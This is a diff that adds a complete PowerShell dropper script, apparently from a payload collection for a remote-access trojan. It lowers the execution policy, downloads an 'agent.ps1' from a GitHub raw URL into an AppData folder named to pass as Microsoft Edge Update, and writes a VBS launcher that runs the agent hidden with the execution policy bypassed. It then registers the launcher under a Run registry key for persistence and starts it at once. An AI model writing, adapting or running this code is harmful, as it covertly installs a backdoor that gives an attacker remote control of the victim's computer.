@@ -1,0 +1,21 @@
+Set-ExecutionPolicy -ExecutionPolicy RemoteSigned -Scope CurrentUser -Force
+
+$installDir = Join-Path $env:APPDATA "MicrosoftEdgeUpdate"
+New-Item -ItemType Directory -Force -Path $installDir
+
+$baseUrl = "https://raw.githubusercontent.com/Red-Ducky/Payloads/main/RAT/agent/"
+Invoke-WebRequest -Uri ($baseUrl + "agent.ps1") -OutFile (Join-Path $installDir "agent.ps1")
+
+$agentPath = Join-Path $installDir "agent.ps1"
+$vbsPath = Join-Path $installDir "launcher.vbs"
+
+@"
+Set objShell = CreateObject("WScript.Shell")
+objShell.Run "powershell.exe -NonInteractive -WindowStyle Hidden -ExecutionPolicy Bypass -File ""$agentPath""", 0, False
+"@ | Set-Content $vbsPath
+
+$regPath = "HKCU:\Software\Microsoft\Windows\CurrentVersion\Run"
+Set-ItemProperty -Path $regPath -Name "MicrosoftEdgeUpdate" -Value "wscript.exe `"$vbsPath`""
+
+Start-Process wscript.exe -ArgumentList "`"$vbsPath`""
+exit
